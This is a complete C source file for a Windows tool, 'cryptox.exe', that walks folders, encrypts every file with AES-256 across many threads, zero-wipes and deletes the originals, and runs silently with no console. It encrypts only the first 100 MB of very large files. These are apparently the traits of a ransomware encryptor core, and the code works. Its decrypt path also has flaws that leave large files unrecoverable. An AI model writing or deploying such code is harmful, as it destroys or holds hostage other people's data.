#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <shellapi.h>

int main(int argc, char* argv[]);

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInst; (void)hPrev; (void)lpCmdLine; (void)nShowCmd;

    int argc = 0;
    wchar_t** wargv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!wargv) return 1;

    char** argv = (char**)malloc(argc * sizeof(char*));
    if (!argv) { LocalFree(wargv); return 1; }

    for (int i = 0; i < argc; i++) {
        int len = WideCharToMultiByte(CP_UTF8, 0, wargv[i], -1, NULL, 0, NULL, NULL);
        argv[i] = (char*)malloc(len);
        if (!argv[i]) {
            for (int j = 0; j < i; j++) free(argv[j]);
            free(argv);
            LocalFree(wargv);
            return 1;
        }
        WideCharToMultiByte(CP_UTF8, 0, wargv[i], -1, argv[i], len, NULL, NULL);
    }

    int result = main(argc, argv);

    for (int i = 0; i < argc; i++) free(argv[i]);
    free(argv);
    LocalFree(wargv);
    return result;
}

#define CHUNK_SIZE        (64 * 1024)
#define PARTIAL_THRESHOLD (512 * 1024 * 1024LL)
#define PARTIAL_SIZE      (100 * 1024 * 1024LL)
#define IV_LEN            16

static BOOL console_attached = FALSE;

static void con_print(const char* msg) {
    if (!console_attached) return;
    printf("%s", msg);
    fflush(stdout);
}

static void write_error(const char* msg) {
    char buf[512];
    snprintf(buf, sizeof(buf), "[!] %s\n", msg);
    con_print(buf);
}

#define QUEUE_CAP 512

typedef struct {
    char  slots[QUEUE_CAP][MAX_PATH];
    int   head, tail, count;
    BOOL  done;
    CRITICAL_SECTION cs;
    HANDLE not_empty;
    HANDLE not_full;
} PathQueue;

static PathQueue queue;

static void queue_init(PathQueue* q) {
    q->head = q->tail = q->count = 0;
    q->done = FALSE;
    InitializeCriticalSection(&q->cs);
    q->not_empty = CreateEventA(NULL, TRUE, FALSE, NULL);
    q->not_full  = CreateEventA(NULL, TRUE, TRUE,  NULL);
}

static void queue_push(PathQueue* q, const char* path) {
    for (;;) {
        WaitForSingleObject(q->not_full, INFINITE);
        EnterCriticalSection(&q->cs);
        if (q->count < QUEUE_CAP) {
            strncpy(q->slots[q->tail], path, MAX_PATH - 1);
            q->slots[q->tail][MAX_PATH - 1] = '\0';
            q->tail = (q->tail + 1) % QUEUE_CAP;
            q->count++;
            SetEvent(q->not_empty);
            if (q->count == QUEUE_CAP) ResetEvent(q->not_full);
            LeaveCriticalSection(&q->cs);
            return;
        }
        LeaveCriticalSection(&q->cs);
    }
}

static int queue_pop(PathQueue* q, char* out) {
    for (;;) {
        WaitForSingleObject(q->not_empty, INFINITE);
        EnterCriticalSection(&q->cs);
        if (q->count > 0) {
            strncpy(out, q->slots[q->head], MAX_PATH - 1);
            out[MAX_PATH - 1] = '\0';
            q->head = (q->head + 1) % QUEUE_CAP;
            q->count--;
            SetEvent(q->not_full);
            if (q->count == 0 && !q->done) ResetEvent(q->not_empty);
            else if (q->count == 0 && q->done) SetEvent(q->not_empty);
            LeaveCriticalSection(&q->cs);
            return 1;
        }
        if (q->done) {
            LeaveCriticalSection(&q->cs);
            return 0;
        }
        ResetEvent(q->not_empty);
        LeaveCriticalSection(&q->cs);
    }
}

static void queue_mark_done(PathQueue* q) {
    EnterCriticalSection(&q->cs);
    q->done = TRUE;
    SetEvent(q->not_empty);
    LeaveCriticalSection(&q->cs);
}

static void queue_destroy(PathQueue* q) {
    DeleteCriticalSection(&q->cs);
    CloseHandle(q->not_empty);
    CloseHandle(q->not_full);
}

static unsigned char MASTER_KEY[32];

static CRITICAL_SECTION list_lock;
static FILE* list_file = NULL;

static void write_to_list(const char* encrypted_path) {
    EnterCriticalSection(&list_lock);
    if (list_file) {
        fprintf(list_file, "%s\n", encrypted_path);
        fflush(list_file);
    }
    LeaveCriticalSection(&list_lock);
}

static void wipe_and_delete(const char* path, long long file_size) {
    HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        DeleteFileA(path);
        return;
    }

    unsigned char zeros[CHUNK_SIZE];
    memset(zeros, 0, sizeof(zeros));

    long long remaining = file_size;
    DWORD written;
    while (remaining > 0) {
        DWORD to_write = (remaining < CHUNK_SIZE) ? (DWORD)remaining : CHUNK_SIZE;
        if (!WriteFile(hf, zeros, to_write, &written, NULL)) break;
        remaining -= written;
    }

    FlushFileBuffers(hf);
    CloseHandle(hf);
    DeleteFileA(path);
}

static void encrypt_file(const char* file_path) {
    char msg[MAX_PATH + 64];

    size_t path_len = strlen(file_path);
    if (path_len > 10 &&
        strcmp(file_path + path_len - 10, ".encrypted") == 0) {
        return;
    }

    char full_path[MAX_PATH];
    if (!GetFullPathNameA(file_path, MAX_PATH, full_path, NULL)) {
        snprintf(msg, sizeof(msg), "[!] Failed to encrypt: %s\n", file_path);
        con_print(msg);
        return;
    }

    HANDLE hf = CreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        snprintf(msg, sizeof(msg), "[!] Failed to encrypt: %s\n", full_path);
        con_print(msg);
        return;
    }
    LARGE_INTEGER li;
    GetFileSizeEx(hf, &li);
    CloseHandle(hf);
    long long file_size = li.QuadPart;

    unsigned char iv[IV_LEN];
    if (RAND_bytes(iv, IV_LEN) != 1) {
        snprintf(msg, sizeof(msg), "[!] Failed to encrypt: %s\n", full_path);
        con_print(msg);
        return;
    }

    FILE* fin = fopen(full_path, "rb");
    if (!fin) {
        snprintf(msg, sizeof(msg), "[!] Failed to encrypt: %s\n", full_path);
        con_print(msg);
        return;
    }

    char new_path[MAX_PATH];
    snprintf(new_path, sizeof(new_path), "%s.encrypted", full_path);
    FILE* fout = fopen(new_path, "wb");
    if (!fout) {
        snprintf(msg, sizeof(msg), "[!] Failed to encrypt: %s\n", full_path);
        con_print(msg);
        fclose(fin);
        return;
    }

    fwrite(iv, 1, IV_LEN, fout);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, MASTER_KEY, iv);

    unsigned char in_buf[CHUNK_SIZE];
    unsigned char out_buf[CHUNK_SIZE + 16];
    int out_len = 0;
    long long remaining = (file_size > PARTIAL_THRESHOLD) ? PARTIAL_SIZE : file_size;

    while (remaining > 0) {
        long long to_read = (remaining < CHUNK_SIZE) ? remaining : CHUNK_SIZE;
        size_t got = fread(in_buf, 1, (size_t)to_read, fin);
        if (got == 0) break;
        remaining -= (long long)got;

        if (remaining == 0) {
            EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, (int)got);
            fwrite(out_buf, 1, out_len, fout);
            EVP_EncryptFinal_ex(ctx, out_buf, &out_len);
            fwrite(out_buf, 1, out_len, fout);
        } else {
            EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, (int)got);
            fwrite(out_buf, 1, out_len, fout);
        }
    }

    EVP_CIPHER_CTX_free(ctx);

    if (file_size > PARTIAL_THRESHOLD) {
        size_t got;
        while ((got = fread(in_buf, 1, CHUNK_SIZE, fin)) > 0)
            fwrite(in_buf, 1, got, fout);
    }

    fflush(fout);
    fclose(fout);
    fclose(fin);

    wipe_and_delete(full_path, file_size);
    write_to_list(new_path);

    snprintf(msg, sizeof(msg), "[+] Encrypted: %s\n", new_path);
    con_print(msg);
}

static void decrypt_file(const char* file_path) {
    char msg[MAX_PATH + 64];

    size_t path_len = strlen(file_path);
    if (path_len <= 10 ||
        strcmp(file_path + path_len - 10, ".encrypted") != 0) {
        snprintf(msg, sizeof(msg), "[!] Not an encrypted file, skipping: %s\n", file_path);
        con_print(msg);
        return;
    }

    char full_path[MAX_PATH];
    if (!GetFullPathNameA(file_path, MAX_PATH, full_path, NULL)) {
        snprintf(msg, sizeof(msg), "[!] Failed to decrypt: %s\n", file_path);
        con_print(msg);
        return;
    }

    FILE* fin = fopen(full_path, "rb");
    if (!fin) {
        snprintf(msg, sizeof(msg), "[!] Failed to decrypt: %s\n", full_path);
        con_print(msg);
        return;
    }

    unsigned char iv[IV_LEN];
    if (fread(iv, 1, IV_LEN, fin) != IV_LEN) {
        snprintf(msg, sizeof(msg), "[!] Failed to read IV: %s\n", full_path);
        con_print(msg);
        fclose(fin);
        return;
    }

char out_path[MAX_PATH];
    strncpy(out_path, full_path, path_len - 10);
    out_path[path_len - 10] = '\0';

    FILE* fout = fopen(out_path, "wb");
    if (!fout) {
        snprintf(msg, sizeof(msg), "[!] Failed to open output: %s\n", out_path);
        con_print(msg);
        fclose(fin);
        return;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, MASTER_KEY, iv);

    unsigned char in_buf[CHUNK_SIZE];
    unsigned char out_buf[CHUNK_SIZE + 16];
    int out_len = 0;
    size_t got;
    int success = 1;

    while ((got = fread(in_buf, 1, CHUNK_SIZE, fin)) > 0) {
        if (!EVP_DecryptUpdate(ctx, out_buf, &out_len, in_buf, (int)got)) {
            success = 0;
            break;
        }
        fwrite(out_buf, 1, out_len, fout);
    }

    if (success) {
        if (!EVP_DecryptFinal_ex(ctx, out_buf, &out_len)) {
            success = 0;
        } else {
            fwrite(out_buf, 1, out_len, fout);
        }
    }

    EVP_CIPHER_CTX_free(ctx);
    fflush(fout);
    fclose(fout);
    fclose(fin);

    if (!success) {
        DeleteFileA(out_path);
        snprintf(msg, sizeof(msg), "[!] Failed to decrypt (wrong key?): %s\n", full_path);
        con_print(msg);
        return;
    }

HANDLE hf = CreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER li;
        GetFileSizeEx(hf, &li);
        CloseHandle(hf);
        wipe_and_delete(full_path, li.QuadPart);
    } else {
        DeleteFileA(full_path);
    }

    snprintf(msg, sizeof(msg), "[+] Decrypted: %s\n", out_path);
    con_print(msg);
}

static DWORD WINAPI encrypt_worker(LPVOID lpParam) {
    (void)lpParam;
    char path[MAX_PATH];
    while (queue_pop(&queue, path))
        encrypt_file(path);
    return 0;
}

static DWORD WINAPI decrypt_worker(LPVOID lpParam) {
    (void)lpParam;
    char path[MAX_PATH];
    while (queue_pop(&queue, path))
        decrypt_file(path);
    return 0;
}

static void scan_directory(const char* dir_path) {
    char search[MAX_PATH];
    snprintf(search, sizeof(search), "%s\\*", dir_path);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 ||
            strcmp(fd.cFileName, "..") == 0) continue;

        char full_path[MAX_PATH];
        snprintf(full_path, sizeof(full_path), "%s\\%s", dir_path, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            scan_directory(full_path);
        else
            queue_push(&queue, full_path);

    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

static void hex_to_key(const char* hex, unsigned char* key) {
    for (int i = 0; i < 32; i++)
        sscanf(hex + (i * 2), "%2hhx", &key[i]);
}

static void generate_key(const char* out_dir, const char* exe_dir) {
    unsigned char key[32];
    if (RAND_bytes(key, sizeof(key)) != 1) {
        write_error("RAND_bytes failed during key generation");
        return;
    }

    char hex[65];
    for (int i = 0; i < 32; i++)
        snprintf(hex + (i * 2), 3, "%02x", key[i]);
    hex[64] = '\0';

    char key_path[MAX_PATH];
    if (out_dir)
        snprintf(key_path, sizeof(key_path), "%s\\key.txt", out_dir);
    else
        snprintf(key_path, sizeof(key_path), "%skey.txt", exe_dir);

    FILE* kf = fopen(key_path, "w");
    if (!kf) {
        char msg[MAX_PATH + 64];
        snprintf(msg, sizeof(msg), "Cannot write key file at: %s", key_path);
        write_error(msg);
        return;
    }
    fprintf(kf, "%s\n", hex);
    fclose(kf);

    char buf[MAX_PATH + 32];
    snprintf(buf, sizeof(buf), "[+] Key written to: %s\n", key_path);
    con_print(buf);
    snprintf(buf, sizeof(buf), "[+] Key: %s\n", hex);
    con_print(buf);
}

static void print_usage(const char* exe) {
    char buf[512];
    con_print("Usage: cryptox.exe [options] <path1> [path2] ...\n\n");
    con_print("Options:\n");
    con_print("  -k <hex_key>    64 hex characters (32 bytes) for AES-256-CBC\n");
    con_print("  -o <dir>        Directory to write files_list.txt and key.txt (default: exe dir)\n");
    con_print("  -g              Generate a random AES-256 key, save to key.txt, then exit\n");
    con_print("  -d <list>       Decrypt mode: path to files_list.txt from encryption run\n");
    con_print("  -h              Show this help and exit\n");
    con_print("\nExamples:\n");
    snprintf(buf, sizeof(buf), "  %s -g -o C:\\Output\n", exe);
    con_print(buf);
    snprintf(buf, sizeof(buf), "  %s -k <hex_key> -o C:\\Output C:\\MyFolder\n", exe);
    con_print(buf);
    snprintf(buf, sizeof(buf), "  %s -d C:\\Output\\files_list.txt -k <hex_key>\n", exe);
    con_print(buf);
}

int main(int argc, char* argv[]) {

    if (AttachConsole(ATTACH_PARENT_PROCESS)) {
        freopen("CONOUT$", "w", stdout);
        freopen("CONOUT$", "w", stderr);
        console_attached = TRUE;
    }

    const char* hex_key      = NULL;
    const char* output_dir   = NULL;
    const char* decrypt_list = NULL;
    int path_start           = 0;
    BOOL gen_key             = FALSE;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-k") == 0 && i + 1 < argc) {
            hex_key = argv[++i];
        } else if (strcmp(argv[i], "-o") == 0 && i + 1 < argc) {
            output_dir = argv[++i];
        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            decrypt_list = argv[++i];
        } else if (strcmp(argv[i], "-g") == 0) {
            gen_key = TRUE;
        } else if (strcmp(argv[i], "-h") == 0) {
            print_usage(argv[0]);
            return 0;
        } else if (hex_key && path_start == 0 && !decrypt_list) {
            path_start = i;
        }
    }

    char exe_dir[MAX_PATH];
    GetModuleFileNameA(NULL, exe_dir, sizeof(exe_dir));
    char* last_slash = strrchr(exe_dir, '\\');
    if (last_slash) *(last_slash + 1) = '\0';

    if (gen_key) {
        generate_key(output_dir, exe_dir);
        return 0;
    }

    if (!hex_key || strlen(hex_key) != 64) {
        write_error("Key must be exactly 64 hex characters");
        return 1;
    }

    hex_to_key(hex_key, MASTER_KEY);

    if (decrypt_list) {
        FILE* lf = fopen(decrypt_list, "r");
        if (!lf) {
            write_error("Cannot open files list");
            return 1;
        }

        queue_init(&queue);

        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD num_threads = si.dwNumberOfProcessors;
        if (num_threads < 1)  num_threads = 1;
        if (num_threads > 64) num_threads = 64;

        HANDLE* threads = (HANDLE*)malloc(num_threads * sizeof(HANDLE));
        if (!threads) {
            write_error("malloc failed for thread handles");
            fclose(lf);
            return 1;
        }

        for (DWORD i = 0; i < num_threads; i++) {
            threads[i] = CreateThread(NULL, 0, decrypt_worker, NULL, 0, NULL);
            if (!threads[i]) { num_threads = i; break; }
        }

        char line[MAX_PATH];
        while (fgets(line, sizeof(line), lf)) {
            size_t len = strlen(line);
            while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r'))
                line[--len] = '\0';
            if (len == 0) continue;
            queue_push(&queue, line);
        }
        fclose(lf);

        queue_mark_done(&queue);

        if (num_threads > 0)
            WaitForMultipleObjects(num_threads, threads, TRUE, INFINITE);

        for (DWORD i = 0; i < num_threads; i++) CloseHandle(threads[i]);
        free(threads);

        queue_destroy(&queue);
        return 0;
    }

if (path_start == 0) {
        write_error("No target paths specified");
        return 1;
    }

    char list_path[MAX_PATH];
    if (output_dir)
        snprintf(list_path, sizeof(list_path), "%s\\files_list.txt", output_dir);
    else
        snprintf(list_path, sizeof(list_path), "%sfiles_list.txt", exe_dir);

    list_file = fopen(list_path, "w");
    if (!list_file) {
        char msg[MAX_PATH + 64];
        snprintf(msg, sizeof(msg), "Cannot create files_list.txt at: %s", list_path);
        write_error(msg);
        return 1;
    }
    InitializeCriticalSection(&list_lock);

    queue_init(&queue);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD num_threads = si.dwNumberOfProcessors;
    if (num_threads < 1)  num_threads = 1;
    if (num_threads > 64) num_threads = 64;

    HANDLE* threads = (HANDLE*)malloc(num_threads * sizeof(HANDLE));
    if (!threads) {
        write_error("malloc failed for thread handles");
        fclose(list_file);
        DeleteCriticalSection(&list_lock);
        return 1;
    }

    for (DWORD i = 0; i < num_threads; i++) {
        threads[i] = CreateThread(NULL, 0, encrypt_worker, NULL, 0, NULL);
        if (!threads[i]) { num_threads = i; break; }
    }

    for (int i = path_start; i < argc; i++) {
        char full[MAX_PATH];
        if (!GetFullPathNameA(argv[i], MAX_PATH, full, NULL)) {
            char msg[MAX_PATH + 64];
            snprintf(msg, sizeof(msg), "Cannot resolve path: %s", argv[i]);
            write_error(msg);
            continue;
        }
        DWORD attr = GetFileAttributesA(full);
        if (attr == INVALID_FILE_ATTRIBUTES) {
            char msg[MAX_PATH + 64];
            snprintf(msg, sizeof(msg), "Path not found: %s", full);
            write_error(msg);
            continue;
        }
        if (attr & FILE_ATTRIBUTE_DIRECTORY)
            scan_directory(full);
        else
            queue_push(&queue, full);
    }

    queue_mark_done(&queue);

    if (num_threads > 0)
        WaitForMultipleObjects(num_threads, threads, TRUE, INFINITE);

    for (DWORD i = 0; i < num_threads; i++) CloseHandle(threads[i]);
    free(threads);

    queue_destroy(&queue);

    fclose(list_file);
    DeleteCriticalSection(&list_lock);

    return 0;
}
